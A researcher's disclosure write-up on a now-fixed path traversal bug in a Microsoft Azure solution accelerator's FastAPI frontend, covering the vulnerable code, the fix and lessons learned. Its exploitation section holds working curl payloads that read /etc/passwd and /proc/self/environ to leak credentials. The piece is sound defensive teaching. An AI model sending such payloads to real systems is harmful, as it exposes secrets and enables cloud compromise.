> [!danger] TL;DR
> A single `os.path.join(BUILD_DIR, user_input)` in the FastAPI catch-all route of Microsoft's **Container-Migration-Solution-Accelerator** allowed **unauthenticated arbitrary file read**. Because modern containers inject secrets as environment variables, reading `/proc/self/environ` turned a "read-only" bug into full credential disclosure. Reported to Microsoft and fixed by resolving the path and validating it stays inside the build directory.

## Introduction

In recent years the cloud became the substrate almost every system we know runs on, and the big cloud vendors started shipping not only infrastructure but also **Solution Accelerators** — ready-made open-source kits that demonstrate how to build a complete solution on top of their services. The goal is to accelerate development: instead of starting from scratch, a developer gets a working architecture, sample code, and deployment scripts, and only has to adapt them.

That's exactly where the risk is born. Code written as a "demo" tends to cut corners on security — but it migrates into real production environments, because it carries the vendor's stamp. This writeup dives into a **Path Traversal** vulnerability I found in **Container-Migration-Solution-Accelerator**, a Microsoft open-source project whose purpose is to migrate container-service configurations to Azure Kubernetes Service. We'll see how one innocent-looking line in the frontend opened a door to arbitrary file read, why the "obvious" defenses don't help, and how Microsoft fixed it.

## What is Path Traversal?

Path Traversal (also known as Directory Traversal, classified under **CWE-22**) happens when an application builds a filesystem path from input the user controls, without verifying that the final path actually stays inside the allowed directory. The attacker abuses special sequences like `../` ("one level up") to "climb" out of the intended directory and reach sensitive files.

A classic example: a server serves files from `/var/www/files/` by a name the user supplies.

- Allowed directory: `/var/www/files/`
- Benign input: `report.pdf` → serves `/var/www/files/report.pdf`
- Malicious input: `../../../etc/passwd` → serves `/etc/passwd`

On Linux and macOS the separator is `/`, and on Windows `\` too. Beyond that there are more sophisticated vectors: URL encoding (`%2e%2e%2f` instead of `../`), double encoding, and symlinks. That's why a **blacklist** of characters almost always fails, and the correct approach is to validate the path **after it has been fully resolved**.

It's important to distinguish two kinds of paths. A **lexical** path is the string as it was written, with all its `../` sequences. A **resolved** (canonical) path is the one the filesystem actually points to, after collapsing the sequences and resolving symlinks. That distinction is the whole game: a check on the lexical path ("does the string contain `../`?") can be bypassed many ways, while a check on the resolved path is robust. The official fix leans on exactly this principle.

## The target: Container-Migration-Solution-Accelerator

The project is a multi-service application from Microsoft that provides an AI-agent-based migration solution for moving container-service configurations from one cloud platform to **Azure Kubernetes Service**. The architecture includes a **Frontend**, a **Backend API**, a **Processor** that pulls tasks from an Azure Storage Queue, and data services like Azure Blob Storage and Cosmos DB. Everything runs as **Azure Container Apps**.

The component we focus on is the Frontend. Unlike many React projects served by a static server like nginx, here the developers chose to write a small **FastAPI** Python server that serves the app's build files. That server, `frontend_server.py`, is the heart of the matter.

## The vulnerable code: one line that breaks everything

The problem is in the server's **catch-all** route — the route that catches every request that didn't match a more specific one, and is meant to serve a static file from the build directory. Here's the vulnerable code from `src/frontend/frontend_server.py`, before the fix:

```python
BUILD_DIR = os.path.join(os.path.dirname(__file__), "dist")
INDEX_HTML = os.path.join(BUILD_DIR, "index.html")

@app.get("/{full_path:path}")
async def serve_app(full_path: str):
    file_path = os.path.join(BUILD_DIR, full_path)
    if os.path.exists(file_path):
        return FileResponse(file_path)
    return FileResponse(INDEX_HTML)
```

Note the route definition: `{full_path:path}`. The `:path` suffix is Starlette's **path converter**, and it's critical here: unlike a normal parameter, which FastAPI stops at a `/`, the `:path` converter "swallows" slashes too. So a value like `../../etc/passwd` arrives at the function as one whole string, with all its `../` intact.

From there it's a short trip. The line `os.path.join(BUILD_DIR, full_path)` looks innocent but hides an infamous Python trap: when one of the components passed to `os.path.join` is an **absolute path** (starts with `/`), the function **discards everything before it**. And even without an absolute path, a run of `../` simply climbs up the filesystem. The result is the same: the final path escapes `BUILD_DIR`.

Let's demonstrate the `os.path.join` trap in a Python console:

```python
>>> import os
>>> os.path.join("/app/frontend/dist", "index.html")
'/app/frontend/dist/index.html'
>>> os.path.join("/app/frontend/dist", "../../../etc/passwd")
'/app/frontend/dist/../../../etc/passwd'
>>> os.path.join("/app/frontend/dist", "/etc/passwd")
'/etc/passwd'
```

## Exploitation: from an innocent request to arbitrary file read

Because this is a simple `GET` request with no authentication required, exploitation is trivial. All you need is an HTTP request with a URL-encoded traversal sequence (`%2F` instead of `/`) that climbs enough levels to reach the filesystem root and from there the target file. Here's a selection of payloads tested against the original project, built and run with the project's own Dockerfile:

```bash
# 1) Read /etc/passwd via path traversal
curl "http://localhost:3000/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
  # → HTTP 200

# 2) Read the application source code
curl "http://localhost:3000/..%2Ffrontend_server.py"

# 3) OS fingerprinting
curl "http://localhost:3000/..%2F..%2F..%2F..%2F..%2Fetc%2Fos-release"
  # → NAME="Microsoft Azure Linux"

# 4) Leak process secrets via the virtual /proc file
curl "http://localhost:3000/..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron"
  # → MSAL client IDs, Azure connection strings, API keys…
```

Note the URL encoding of the traversal sequence. Sending a "clean" `../` might get normalized by the client or by a middlebox before it reaches the app — but `%2F` passes through the middle layers as-is and is only decoded **inside Starlette**, exactly at the wrong place. Another technical point: the vulnerable code uses `os.path.exists` rather than `os.path.isfile`, so the check also passes for things that aren't regular files — for example the virtual file `/proc/self/environ`.

What can be read? Any file the process user has read permission for. In a container that includes `/etc/passwd`, the application's own source, and — most critically — the process's environment variables via `/proc/self/environ`.

> [!warning] Why /proc/self/environ is so powerful
> It's a virtual file the OS exposes for every process, containing all of its environment variables in cleartext. Developers rightly avoid hardcoding secrets in code — but they inject them as environment variables, and so, ironically, make them *easier* to extract through a path-traversal bug. In modern containers, API keys, connection strings, and Azure tokens are injected exactly this way. So a single file read rolls up into lateral movement and broad compromise of the whole cloud environment.

The Frontend isn't an isolated component — it runs in the same Azure Container Apps environment alongside the API and Processor, with access to the same Azure resources (Blob Storage, Storage Queue, Cosmos DB). Leaking its connection strings and credentials from environment variables opens the door to all of those data services.

## A complementary issue: the /config endpoint

Alongside the traversal itself, I noticed a complementary problem. The `/config` endpoint returned sensitive configuration values to any **unauthenticated** caller: MSAL client IDs, the Azure AD authority URL, API URLs, and scopes. Worse, the CORS policy was set to `allow_origins=["*"]`, so any malicious site could read those values directly from JavaScript in a victim's browser. Combined with arbitrary file read, this yields a broad information-disclosure surface over the service's configuration and credentials.

## The fix: validate the path after resolving it

The golden rule for fixing Path Traversal is **not** "filter out `../`" — an approach that can almost always be bypassed — but rather to **resolve the path fully and then verify it stays inside the allowed directory**. That's exactly what Microsoft did in commit `3a0ec34`:

```python
@app.get("/{full_path:path}")
async def serve_app(full_path: str):
    # BUILD_DIR will parse the full path:
    file_path = os.path.realpath(os.path.join(BUILD_DIR, full_path))
    build_dir_real = os.path.realpath(BUILD_DIR)
    if not file_path.startswith(build_dir_real + os.sep) \
            and file_path != build_dir_real:
        return FileResponse(INDEX_HTML)
    if os.path.isfile(file_path):
        return FileResponse(file_path)
```

The key is `os.path.realpath`: it resolves symlinks and collapses all `../` sequences into a single absolute, canonical path. Only *after* resolving does the code check that the final path starts with `build_dir_real + os.sep`.

> [!tip] Don't forget the separator
> Adding `os.sep` isn't a minor nuance. Without it, a directory like `/app/dist-evil` would pass the check just because it starts with the string `/app/dist`. That's a classic **prefix-matching** trap that's easy to miss.

Beyond the route fix, the patch also added an allow-list-based CORS mechanism and an Origin check on the `/config` endpoint, so sensitive configuration isn't exposed to cross-origin requests. It's a root-cause fix, not a symptom patch.

## Lessons: why does this keep happening?

This bug isn't unique to one project. The pattern `os.path.join(base, user_input)` recurs in countless projects, especially in young AI and MCP projects where the pace is fast and the focus is functionality.

1. **"Demo code" is not exempt from security.** Once a project carries the vendor's name and is meant to be deployed, assume someone will run it in production.
2. **Don't rely on client-side normalization.** Browsers and `curl` do clean up paths, but an attacker sends the raw request directly.
3. **Validate *after* resolving, not before.** The only check that stands up to encodings, symlinks, and absolute paths is comparing the canonical path against the allowed directory.

One last point worth internalizing concerns Starlette's path converter. Many developers use `{full_path:path}` as a convenient default for serving an SPA, without noticing that `:path` deliberately passes through `/` characters that are normally blocked. Any such route that ends in filesystem access is an immediate suspect and must be paired with strict path validation. When possible, prefer serving static files through a dedicated, hardened mechanism like Starlette's `StaticFiles` rather than a hand-rolled route that assembles paths itself.

## Disclosure

Reported to Microsoft through coordinated vulnerability disclosure; fixed in commit `3a0ec34`. This writeup was originally published in Hebrew in **Digital Whisper** (September 2026).

## References

- [Container-Migration-Solution-Accelerator (GitHub)](https://github.com/microsoft/Container-Migration-Solution-Accelerator)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory (MITRE)](https://cwe.mitre.org/data/definitions/22.html)
- [Path Traversal (OWASP)](https://owasp.org/www-community/attacks/Path_Traversal)
- [What is path traversal? (PortSwigger Web Security Academy)](https://portswigger.net/web-security/file-path-traversal)
- [Python `os.path.join` docs](https://docs.python.org/3/library/os.path.html#os.path.join)
